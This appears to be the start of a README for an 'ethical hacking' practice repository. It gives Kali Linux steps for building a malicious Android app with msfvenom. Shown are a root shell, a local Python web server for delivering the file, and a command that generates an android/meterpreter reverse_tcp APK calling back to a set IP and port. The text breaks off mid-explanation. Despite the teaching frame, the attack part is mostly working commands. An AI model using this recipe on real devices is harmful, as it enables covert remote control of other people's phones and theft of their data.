# Ethical-Hacking

In these practices we will put in the form of code and a step-by-step explanation of each practice.

## First Practice

### msfvenom apk

In this first practice we will use msfvenom to create an application which will aim to control an Android device for ethical purposes.


#### Escalate privileges
┌──(kali㉿CarlosSantos)-[~]
└─$ `sudo -s`


#### We check what our hostname is
┌──(root㉿CarlosSantos)-[/home/kali]
└─# `hostname -I`

#### We create a local server with python3
┌──(root㉿CarlosSantos)-[/home/kali]
└─# `python3 -m http.server 80`



   >[!IMPORTANT]
   >
   >Remember to connect to the server with your android, in this case they must be on the same network since the server is local, just like our attack.


 >[!INFO]
 >
 >If you do not have kali metasploit installed on your system, you must install it `sudo apt install metasploit-framework`


#### We use msfvenom
┌──(root㉿CarlosSantos)-[/home/kali]
└─# `msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.4.239 LPORT=443 -o practice.apk`

1. *msfvenom: Es el nombre del comando que invoca la herramienta msfvenom.
-p *
